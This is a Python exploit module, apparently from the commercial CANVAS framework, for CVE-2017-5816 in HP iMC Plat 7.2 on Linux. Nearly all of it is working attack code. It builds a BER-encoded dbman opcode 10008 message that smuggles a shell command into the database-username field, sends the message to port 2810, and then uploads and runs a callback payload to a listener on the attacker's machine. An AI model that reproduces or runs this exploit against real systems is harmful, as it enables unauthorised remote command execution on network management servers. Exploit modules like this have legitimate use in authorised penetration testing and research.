#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import base64
import string
import re
import urllib
import struct
import binascii
import socket
import logging
from pyasn1.type.univ import *
from pyasn1.type.namedtype import *
from pyasn1.codec.ber import encoder
from collections import namedtuple

# path appends
if '.' not in sys.path:
    sys.path.append('.')

# CANVAS imports
from exploitutils import *
from ExploitTypes.php_multi import *
import canvasengine
from ExploitTypes.CommandLineExecuter import CommandExploit
from phplistener import get_php_stage1
from libs.canvasos import canvasos


NAME                            = "HP iMC Plat 7.2 dbman Code Execution (Linux)"
DESCRIPTION                     = "HP iMC Plat 7.2 dbman Opcode 10008 Command Injection RCE (Linux)"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Hewlett Packard"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = "CVE-2017-5816"
DOCUMENTATION["CVE Url"]        = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5816"
DOCUMENTATION["References"]     = "http://www.zerodayinitiative.com/advisories/ZDI-17-340/"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux"] ]
PROPERTY['VERSION']             = [ "7.2" ]

NOTES                           = """

We exploit a command injection in HP iMC Plat 7.2 to obtain command execution

Due to technical limitations this exploit might spawn more than one node 
"""

CHANGELOG                       = """
"""


class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        CommandExploit.__init__(self)
        tcpexploit.__init__(self)
        self.name = NAME
        self.host = None
        self.port = 2810
        self.supports_universal = True

    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                [optional]")
        logging.info("-l <local ip>")
        logging.info("-d <local port>")

    def getargs(self):
        tcpexploit.getargs(self)
        self.getargs_cle()

    def neededListenerTypes(self):
        return self.cle_neededListenerTypes()

    def run_blind_command(self, command):
        logging.debug("Running command (blind): %s" % command)

        class DbmanMsg(Sequence):
            componentType = NamedTypes(
                NamedType('dbIp', OctetString()),
                NamedType('iDBType', Integer()),
                NamedType('dbInstance', OctetString()),
                NamedType('dbSaUserName', OctetString()),
                NamedType('dbSaPassword', OctetString()),
                NamedType('strOraDbIns', OctetString())
            )

        msg = DbmanMsg()
        msg['dbIp'] = self.host
        msg['iDBType'] = 4
        msg['dbInstance'] = "a"
        msg['dbSaUserName'] = "b' & " + command + " #"
        msg['dbSaPassword'] = "c"
        msg['strOraDbIns'] = "d"

        encodedMsg = encoder.encode(msg, defMode=True)
        logging.debug("encodedMsg: %s" % encodedMsg)
        s = struct.Struct(">ii%ds" % len(encodedMsg))
        packed_data = s.pack(10008, len(encodedMsg), encodedMsg)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        sock.send(packed_data)
        sock.close()

        return True

    def run(self):
        self.getargs()
        logging.debug("Host: " + self.host)
        logging.debug("Port: " + str(self.port))
        logging.debug("Command: " + str(self.command))

        self.socknode = self.argsDict["passednodes"][0]
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port), showlog=1)

        logging.debug("Trying to get a mosdef node")
        self.get_os()
        if self.target_os.base == "Unknown":
            logging.error("Error while retrieving information on the target OS")
            self.setProgress(-1)
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
            return 0
        if self.target_os.base != "Linux":
            logging.error("Target OS not supported")
            self.setProgress(-1)
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
            return 0
        result = self.upload_and_execute()
        if result:
            self.setProgress(100)
            self.setInfo("%s attacking %s:%d (success)"%(self.name,self.host,self.port))
            self.succeeded = 1
        else:
            self.setProgress(-1)
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
        return result

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    standard_callback_commandline(app)
